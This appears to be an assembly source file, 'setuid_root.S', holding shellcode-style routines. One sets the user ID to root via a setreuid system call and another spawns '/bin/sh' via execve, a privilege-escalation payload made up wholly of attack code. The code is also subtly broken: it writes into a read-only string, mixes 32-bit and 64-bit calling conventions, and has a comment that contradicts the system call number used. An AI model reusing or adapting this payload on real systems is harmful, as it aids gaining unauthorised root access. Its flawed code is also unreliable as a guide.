	.file "setuid_root.S"
	.intel_syntax noprefix
	.section .rodata
.LC0:
	.string "/bin/sh /bin/sh"
.LC1:
	.string "hellooo"

	.text
	.globl setuid_root
setuid_root:
#;#; set UID to root
	#push rax
	#push rdi
	#push rsi
	push rax
	push rbx
	push rcx	

	# print a bit
	#mov rax, 4
#	mov rdi, 1
#	mov rsi, .LC1
#	mov rdx, 7
#	int 0x80
	#jmp su_end

	xor eax, eax 
	mov ebx, 0  #; real UID
	mov ecx, 0  #; effe UID
#	mov rdi, 0
#	mov rsi, 0
	mov eax, 113 #; syscall 70
	int 0x80    #; call kernel
su_end:
	#pop rsi
	#pop rdi
#	pop rax
	pop rcx
	pop rbx
	pop rax
	ret


#;#; set up strings for execve shell
	.text
	.globl spawn_root_shell
	.type spawn_root_shell, @function
spawn_root_shell:
	push rax
	push rbx
	push rdi
	push rsi
	push rdx

	xor rax, rax
	mov ebx, .LC0 
	mov [ebx+7],  al 	#; null terminate @ byte 7
	mov [ebx+8],  ebx	#; 
	mov [ebx+12], eax

	mov eax, 11		#; syscall no. EXECVE
#;	lea ecx, [ebx+8]
#;	lea edx, [ebx+12]
	lea rdi, [ebx]	 	#; "/bin/sh"
	lea rsi, [ebx+8]	#; "sh"
	lea rdx, [ebx+7]	#; NUL
	int 0x80		#; call kernel

	pop rdx
	pop rsi
	pop rdi
	pop rbx
	pop rax
	ret

